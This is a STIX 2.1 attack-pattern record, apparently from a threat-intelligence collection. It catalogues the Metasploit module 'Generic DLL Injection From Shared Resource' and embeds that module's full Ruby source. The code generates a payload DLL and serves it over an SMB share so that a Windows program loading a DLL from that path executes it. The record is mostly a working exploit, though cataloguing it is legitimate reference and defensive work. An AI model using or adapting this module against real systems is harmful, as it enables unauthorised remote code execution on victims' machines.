{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08fb340b-882a-41dc-be28-0f6230739a33",
    "created": "2024-08-14T16:56:19.984337Z",
    "modified": "2024-08-14T16:56:19.984341Z",
    "name": "Generic DLL Injection From Shared Resource",
    "description": " This is a general-purpose module for exploiting conditions where a DLL can be loaded from a specified SMB share. This module serves payloads as DLLs over an SMB service. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/generic_smb_dll_injection.rb",
            "external_id": "generic_smb_dll_injection.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::SMB::Server::Share\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'          => 'Generic DLL Injection From Shared Resource',\n      'Description'   => %q{\n        This is a general-purpose module for exploiting conditions where a DLL can be loaded\n        from a specified SMB share. This module serves payloads as DLLs over an SMB service.\n      },\n      'Author'      =>\n        [\n          'Matthew Hall <hallm[at]sec-1.com>'\n        ],\n      'References'     =>\n        [\n          ['CWE', '114']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => false,\n      'Platform'       => 'win',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'DisableNops' => true\n        },\n      'Targets'        =>\n        [\n          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],\n          [ 'Windows x64', { 'Arch' => ARCH_X64 } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-03-04'\n    ))\n\n    register_options(\n      [\n        OptString.new('FILE_NAME', [ false, 'DLL File name to share (Default: random .dll)'])\n      ])\n\n    deregister_options('FILE_CONTENTS')\n  end\n\n  def setup\n    super\n\n    self.file_contents = generate_payload_dll\n    self.file_name = datastore['FILE_NAME'] || \"#{Rex::Text.rand_text_alpha(4 + rand(3))}.dll\"\n    print_status(\"File available on #{unc}...\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-03-04",
    "x_mitre_platforms": [
        "win'"
    ]
}